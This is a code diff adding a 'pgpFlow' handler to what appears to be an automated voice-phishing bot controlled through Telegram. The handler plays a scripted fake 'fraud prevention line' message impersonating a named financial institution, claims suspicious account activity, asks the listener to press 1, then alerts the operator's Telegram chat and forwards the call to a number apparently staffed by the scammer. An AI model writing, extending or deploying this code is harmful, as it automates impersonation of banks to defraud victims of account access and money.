@@ -838,3 +838,77 @@ export const cardFlow = async (
     });
   }
 };
+
+export const pgpFlow = async (
+  dtmf: string,
+  res: Response,
+  language: string,
+  chatId: number | undefined,
+  step: string,
+  destination: string,
+  transferNumber: string,
+  institutionName: string,
+  from: string,
+): Promise<Response> => {
+  if (dtmf && dtmf === '1') {
+    await bot.telegram.sendMessage(
+      Number(chatId),
+      `On call (${destination}) 🤳🏽`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
+    return res.json({
+      id: uuidv4(),
+      title: `${chatId} - Forward call to ${transferNumber}`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'transfer',
+          options: {
+            source: from,
+            destination: transferNumber,
+          },
+        },
+      ],
+    });
+  } else {
+    return res.json({
+      id: uuidv4(),
+      title: `Calling - ${chatId}`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            ifMachine: 'delay',
+            payload: `You have selected an INVALID option. Welcome to the ${institutionName} fraud prevention line. We recently notice a suspicious activity on your account, if this was you simply hang up. If this was not you please press 1 to speak to a ${institutionName} representative to better assist you in securing your account`,
+            language,
+            voice: 'female',
+            length: 5,
+          },
+          onKeypressGoto: 'nextStep',
+          onKeypressVar: 'dtmf',
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'nextStep',
+          onKeypressVar: 'dtmf',
+        },
+        {
+          id: 'nextStep',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?transferNumber=${transferNumber}&from=${from}`,
+          },
+        },
+      ],
+    });
+  }
+};
